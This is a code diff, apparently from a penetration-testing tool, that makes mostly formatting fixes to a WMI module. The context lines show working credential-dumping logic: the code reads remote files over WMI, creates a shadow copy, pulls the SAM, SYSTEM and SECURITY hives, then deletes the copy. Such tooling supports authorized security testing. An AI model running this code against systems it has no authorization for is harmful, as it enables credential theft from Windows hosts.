@@ -369,8 +369,8 @@ class wmi(connection):
 
     def read_file(self, remote_path):
         self.logger.debug(f"Try reading file {remote_path}")
-        escaped_path = remote_path.replace("\\","\\\\")
-        
+        escaped_path = remote_path.replace("\\", "\\\\")
+
         # Load the Namespace
         try:
             powershellv3_namespace = self.iWbemLevel1Login.NTLMLogin("//./root/Microsoft/Windows/Powershellv3", NULL, NULL)
@@ -380,13 +380,13 @@ class wmi(connection):
             return None
 
         # Read the file
-        try: 
+        try:
             object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
             iWbemClassObject, _ = powershellv3_namespace.GetObject(object_path)
         except DCERPCSessionError as e:
-                if e.error_code == 0x80041002:
-                    logging.debug(f"Cannot find {fullpath} file")
-                return None
+            if e.error_code == 0x80041002:
+                self.logger.debug(f"Cannot find {remote_path} file")
+            return None
 
         obj = iWbemClassObject.getProperties()
 
@@ -395,17 +395,15 @@ class wmi(connection):
             if prop_name == "FileData":
                 file_data = prop_value["value"]
                 break
-        
+
         if len(file_data) < 4:
             return None
-        
+
         # Unpack it
         file_length = struct.unpack(">I", bytes(file_data[:4]))[0]
-        file_content = bytes(file_data[4:4 + file_length])
+        return bytes(file_data[4:4 + file_length])
 
-        return file_content
-
-    def get_file_single(self, remote_path, download_path):        
+    def get_file_single(self, remote_path, download_path):
 
         if self.args.append_host:
             download_path = f"{self.hostname}-{remote_path}"
@@ -414,7 +412,7 @@ class wmi(connection):
         if file_data is None:
             return False
         else:
-            
+
             with open(download_path, "wb+") as file:
                 file.write(file_data)
             return True
@@ -443,7 +441,7 @@ class wmi(connection):
 
         # Creating Shadow Volumes
         try:
-            win32_shadow_copy,_ = cimv2_namespace.GetObject("Win32_ShadowCopy")
+            win32_shadow_copy, _ = cimv2_namespace.GetObject("Win32_ShadowCopy")
             self.logger.debug("Trying to create SS remotely via WMI")
             result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
             shadow_id = result.ShadowID
@@ -459,18 +457,18 @@ class wmi(connection):
         props = obj.getProperties()
         shadow_copy = {k: v["value"] for k, v in props.items()}
         self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
-            
+
         # Get the SAM hive
         sam_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SAM"
         sam_hive_recovered = self.get_file_single(sam_hive_path, f"{output_filename}.sam")
         if sam_hive_recovered:
             self.logger.debug("Got SAM hive")
-            
+
         system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
         system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
         if system_hive_recovered:
             self.logger.debug("Got SYSTEM hive")
-        
+
         # Delete the ShadowCopy
         wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
         self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
@@ -510,7 +508,7 @@ class wmi(connection):
 
         # Creating Shadow Volumes
         try:
-            win32_shadow_copy,_ = cimv2_namespace.GetObject("Win32_ShadowCopy")
+            win32_shadow_copy, _ = cimv2_namespace.GetObject("Win32_ShadowCopy")
             self.logger.debug("Trying to create SS remotely via WMI")
             result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
             shadow_id = result.ShadowID
@@ -526,18 +524,18 @@ class wmi(connection):
         props = obj.getProperties()
         shadow_copy = {k: v["value"] for k, v in props.items()}
         self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
-            
+
         # Get the SECURITY hive
         security_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SECURITY"
         security_hive_recovered = self.get_file_single(security_hive_path, f"{output_filename}.security")
         if security_hive_recovered:
             self.logger.debug("Got SECURITY hive")
-            
+
         system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
         system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
         if system_hive_recovered:
             self.logger.debug("Got SYSTEM hive")
-        
+
         # Delete the ShadowCopy
         wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
         self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
